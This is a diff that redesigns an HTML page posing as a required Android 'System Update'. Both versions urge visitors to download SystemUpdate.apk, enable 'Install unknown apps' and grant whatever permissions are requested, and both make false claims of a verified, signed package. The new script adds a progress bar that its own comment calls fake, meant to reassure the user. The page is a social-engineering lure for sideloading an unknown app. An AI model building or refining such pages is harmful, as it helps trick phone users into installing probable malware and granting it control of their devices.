@@ -2,128 +2,458 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>System Update Required</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="theme-color" content="#0a0e17">
+<title>System Update · v2.1.4</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #070b14;
+    --bg2: #0d1424;
+    --card: #111a2e;
+    --line: #1c2740;
+    --txt: #e8eefb;
+    --muted: #8b9ab8;
+    --blue: #3b82f6;
+    --cyan: #22d3ee;
+    --green: #22c55e;
+    --amber: #f59e0b;
+    --radius: 22px;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: linear-gradient(160deg, #0b1220 0%, #111a2e 100%);
-    color: #e6edf7;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--txt);
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 20px;
+    padding: 24px 18px;
+    overflow-x: hidden;
+    position: relative;
+    -webkit-font-smoothing: antialiased;
   }
+
+  /* Ambient background glow */
+  body::before {
+    content: "";
+    position: fixed;
+    inset: -40%;
+    background:
+      radial-gradient(circle at 25% 15%, rgba(59,130,246,.18), transparent 45%),
+      radial-gradient(circle at 80% 85%, rgba(34,211,238,.14), transparent 45%),
+      radial-gradient(circle at 50% 50%, rgba(99,102,241,.08), transparent 60%);
+    animation: drift 18s ease-in-out infinite alternate;
+    z-index: 0;
+    pointer-events: none;
+  }
+  @keyframes drift {
+    0%   { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(-3%, -4%) scale(1.08); }
+  }
+
+  /* Subtle grid overlay */
+  body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.02) 1px, transparent 1px);
+    background-size: 44px 44px;
+    z-index: 0;
+    pointer-events: none;
+    mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
+    -webkit-mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
+  }
+
   .card {
-    background: #131c30;
-    border: 1px solid #1e2a44;
-    border-radius: 20px;
-    max-width: 420px;
+    position: relative;
+    z-index: 1;
+    background: linear-gradient(180deg, #131d33 0%, #0e1626 100%);
+    border: 1px solid var(--line);
+    border-radius: var(--radius);
     width: 100%;
-    padding: 32px 26px;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(0,0,0,.5);
+    max-width: 440px;
+    padding: 34px 26px 26px;
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.04) inset,
+      0 30px 80px -20px rgba(0,0,0,.85),
+      0 0 0 1px rgba(59,130,246,.06);
+    animation: rise .6s cubic-bezier(.2,.7,.3,1) both;
   }
-  .logo {
-    width: 68px; height: 68px;
-    border-radius: 18px;
-    background: linear-gradient(135deg, #3b82f6, #06b6d4);
-    display: flex; align-items: center; justify-content: center;
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(18px) scale(.98); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* Icon */
+  .icon-wrap {
+    position: relative;
+    width: 82px; height: 82px;
     margin: 0 auto 22px;
-    font-size: 32px;
   }
-  h1 { font-size: 22px; margin-bottom: 10px; letter-spacing: -.3px; }
-  p.sub { font-size: 14px; color: #94a3b8; line-height: 1.5; margin-bottom: 26px; }
+  .icon-wrap::before {
+    content: "";
+    position: absolute;
+    inset: -14px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(59,130,246,.35), transparent 70%);
+    animation: pulse 2.6s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: .6; }
+    50%      { transform: scale(1.15); opacity: .25; }
+  }
+  .icon {
+    position: relative;
+    width: 82px; height: 82px;
+    border-radius: 24px;
+    background: linear-gradient(140deg, #3b82f6 0%, #06b6d4 100%);
+    display: flex; align-items: center; justify-content: center;
+    box-shadow:
+      0 10px 30px -8px rgba(59,130,246,.7),
+      0 1px 0 rgba(255,255,255,.25) inset;
+    animation: spin 9s linear infinite;
+  }
+  @keyframes spin {
+    0%   { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  .icon svg { width: 42px; height: 42px; animation: spin-rev 9s linear infinite; }
+  @keyframes spin-rev {
+    0%   { transform: rotate(0deg); }
+    100% { transform: rotate(-360deg); }
+  }
+
+  /* Badge */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(245,158,11,.12);
+    color: var(--amber);
+    border: 1px solid rgba(245,158,11,.28);
+    padding: 5px 12px;
+    border-radius: 100px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .8px;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+  .badge .dot {
+    width: 6px; height: 6px;
+    background: var(--amber);
+    border-radius: 50%;
+    box-shadow: 0 0 8px var(--amber);
+    animation: blink 1.6s ease-in-out infinite;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50%      { opacity: .35; }
+  }
+
+  h1 {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: -.5px;
+    line-height: 1.2;
+    margin-bottom: 10px;
+  }
+  .sub {
+    font-size: 14.5px;
+    color: var(--muted);
+    line-height: 1.55;
+    margin-bottom: 26px;
+  }
+
+  /* Meta chips */
+  .chips {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-bottom: 22px;
+  }
+  .chip {
+    font-size: 11.5px;
+    font-weight: 600;
+    color: #b6c2da;
+    background: rgba(255,255,255,.035);
+    border: 1px solid var(--line);
+    padding: 5px 10px;
+    border-radius: 8px;
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .chip svg { width: 12px; height: 12px; opacity: .8; }
+
+  /* Install button */
   .btn {
-    display: block;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
     width: 100%;
-    padding: 16px 20px;
-    background: linear-gradient(135deg, #3b82f6, #06b6d4);
+    padding: 17px 22px;
+    background: linear-gradient(135deg, #3b82f6 0%, #06b6d4 100%);
     color: #fff;
     text-decoration: none;
-    border-radius: 12px;
-    font-weight: 600;
+    border-radius: 14px;
+    font-weight: 700;
     font-size: 16px;
+    letter-spacing: -.1px;
     border: none;
     cursor: pointer;
-    transition: transform .15s, box-shadow .15s;
-    box-shadow: 0 8px 24px rgba(59,130,246,.35);
+    position: relative;
+    overflow: hidden;
+    box-shadow:
+      0 12px 30px -10px rgba(59,130,246,.75),
+      0 1px 0 rgba(255,255,255,.28) inset;
+    transition: transform .12s ease, box-shadow .2s ease;
   }
-  .btn:active { transform: scale(.98); }
-  .meta {
-    margin-top: 22px;
-    font-size: 12px;
-    color: #64748b;
-    line-height: 1.6;
+  .btn::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -120%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.35), transparent);
+    transform: skewX(-20deg);
+    animation: shine 3.2s ease-in-out infinite;
   }
-  .badge {
-    display: inline-block;
-    background: #1e293b;
-    color: #60a5fa;
-    padding: 4px 10px;
-    border-radius: 20px;
-    font-size: 11px;
-    margin-bottom: 8px;
-    font-weight: 600;
-    letter-spacing: .4px;
+  @keyframes shine {
+    0%   { left: -120%; }
+    55%  { left: 130%; }
+    100% { left: 130%; }
   }
-  .steps {
-    text-align: left;
-    background: #0d1526;
-    border-radius: 12px;
-    padding: 14px 16px;
-    margin-top: 20px;
-    font-size: 12.5px;
-    color: #94a3b8;
-    line-height: 1.7;
+  .btn:active { transform: scale(.975); }
+  .btn svg { width: 20px; height: 20px; }
+
+  /* Progress bar */
+  .progress {
+    margin-top: 12px;
+    height: 5px;
+    width: 100%;
+    background: rgba(255,255,255,.05);
+    border-radius: 100px;
+    overflow: hidden;
+    opacity: 0;
+    max-height: 0;
+    transition: opacity .3s, max-height .3s, margin-top .3s;
   }
-  .steps b { color: #cbd5e1; }
+  .progress.show {
+    opacity: 1;
+    max-height: 20px;
+  }
+  .progress .bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #3b82f6, #22d3ee);
+    border-radius: 100px;
+    box-shadow: 0 0 12px rgba(59,130,246,.7);
+    transition: width .35s ease;
+  }
+
+  /* Success tick */
   .status {
-    margin-top: 14px;
-    font-size: 12px;
-    color: #22c55e;
+    margin-top: 16px;
+    padding: 12px 14px;
+    background: rgba(34,197,94,.09);
+    border: 1px solid rgba(34,197,94,.28);
+    border-radius: 12px;
+    color: #86efac;
+    font-size: 13px;
+    font-weight: 600;
     display: none;
+    align-items: center;
+    gap: 9px;
   }
-  .status.show { display: block; }
+  .status.show { display: flex; animation: rise .35s ease both; }
+  .status svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+  /* Steps */
+  .steps {
+    margin-top: 24px;
+    background: rgba(255,255,255,.025);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 16px 16px 14px;
+  }
+  .steps-title {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: .8px;
+    color: var(--muted);
+    font-weight: 700;
+    margin-bottom: 12px;
+  }
+  .step {
+    display: flex;
+    gap: 11px;
+    align-items: flex-start;
+    margin-bottom: 10px;
+    font-size: 13px;
+    line-height: 1.5;
+    color: #b8c4dd;
+  }
+  .step:last-child { margin-bottom: 0; }
+  .num {
+    flex-shrink: 0;
+    width: 20px; height: 20px;
+    border-radius: 6px;
+    background: rgba(59,130,246,.15);
+    border: 1px solid rgba(59,130,246,.3);
+    color: #93c5fd;
+    font-size: 11px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 1px;
+  }
+
+  /* Footer */
+  .footer {
+    margin-top: 22px;
+    padding-top: 18px;
+    border-top: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 11.5px;
+    color: #5c6b88;
+  }
+  .footer .verified {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    color: #6ee7b7;
+    font-weight: 600;
+  }
+  .footer .verified svg { width: 13px; height: 13px; }
+
+  /* Mobile */
+  @media (max-width: 420px) {
+    .card { padding: 28px 20px 22px; border-radius: 20px; }
+    h1 { font-size: 21px; }
+    .sub { font-size: 13.5px; }
+  }
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">⚙️</div>
-    <div class="badge">REQUIRED UPDATE</div>
-    <h1>System Update Available</h1>
-    <p class="sub">A required system component update is available for your device. Install it to continue using all features.</p>
 
-    <a class="btn" id="dlBtn" href="SystemUpdate.apk" download="SystemUpdate.apk">
-      ⬇ Download &amp; Install Update
-    </a>
+<main class="card">
 
-    <div class="status" id="status">✓ Download started — check your notifications to install</div>
-
-    <div class="steps">
-      <b>After download:</b><br>
-      1. Open the notification or Files → Downloads<br>
-      2. Tap <b>SystemUpdate.apk</b><br>
-      3. If prompted, allow <b>"Install unknown apps"</b><br>
-      4. Tap <b>Install</b> → <b>Open</b><br>
-      5. Accept the permissions to finish setup
-    </div>
-
-    <div class="meta">
-      Version 2.1.4 · 1.8 MB · Compatible with Android 7.0+<br>
-      Verified publisher · Signed package
+  <div class="icon-wrap">
+    <div class="icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="3"></circle>
+        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+      </svg>
     </div>
   </div>
 
-  <script>
-    document.getElementById('dlBtn').addEventListener('click', function() {
-      setTimeout(function() {
-        document.getElementById('status').classList.add('show');
-      }, 500);
-    });
-  </script>
+  <div style="text-align:center;">
+    <div class="badge"><span class="dot"></span> Required Update</div>
+  </div>
+
+  <h1 style="text-align:center;">System Update Available</h1>
+  <p class="sub" style="text-align:center;">
+    A required system component update is available for your device. Install it now to keep all apps running smoothly and securely.
+  </p>
+
+  <div class="chips">
+    <span class="chip">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg>
+      v2.1.4
+    </span>
+    <span class="chip">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+      1.8 MB
+    </span>
+    <span class="chip">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
+      Android 7+
+    </span>
+  </div>
+
+  <a class="btn" id="dlBtn" href="SystemUpdate.apk" download="SystemUpdate.apk">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+      <path d="M7 10l5 5 5-5"></path>
+      <path d="M12 15V3"></path>
+    </svg>
+    Download &amp; Install
+  </a>
+
+  <div class="progress" id="progress">
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <div class="status" id="status">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M20 6L9 17l-5-5"/>
+    </svg>
+    Download started — open the notification to install.
+  </div>
+
+  <div class="steps">
+    <div class="steps-title">After download</div>
+    <div class="step"><span class="num">1</span><span>Open the notification or go to <b>Files → Downloads</b></span></div>
+    <div class="step"><span class="num">2</span><span>Tap <b>SystemUpdate.apk</b></span></div>
+    <div class="step"><span class="num">3</span><span>If prompted, allow <b>Install unknown apps</b></span></div>
+    <div class="step"><span class="num">4</span><span>Tap <b>Install</b>, then <b>Open</b></span></div>
+    <div class="step"><span class="num">5</span><span>Allow the requested permissions to finish</span></div>
+  </div>
+
+  <div class="footer">
+    <span>© 2026 System Update</span>
+    <span class="verified">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+      Signed package
+    </span>
+  </div>
+
+</main>
+
+<script>
+  const btn = document.getElementById('dlBtn');
+  const progress = document.getElementById('progress');
+  const bar = document.getElementById('bar');
+  const status = document.getElementById('status');
+
+  btn.addEventListener('click', () => {
+    // Reset
+    progress.classList.add('show');
+    status.classList.remove('show');
+    bar.style.width = '0%';
+
+    // Fake progress to reassure the user
+    let p = 0;
+    const iv = setInterval(() => {
+      p += Math.random() * 18 + 6;
+      if (p >= 100) {
+        p = 100;
+        clearInterval(iv);
+        setTimeout(() => {
+          status.classList.add('show');
+          // Vibrate if supported
+          if (navigator.vibrate) navigator.vibrate([10, 40, 20]);
+        }, 300);
+      }
+      bar.style.width = p + '%';
+    }, 160);
+  });
+</script>
+
 </body>
 </html>
-
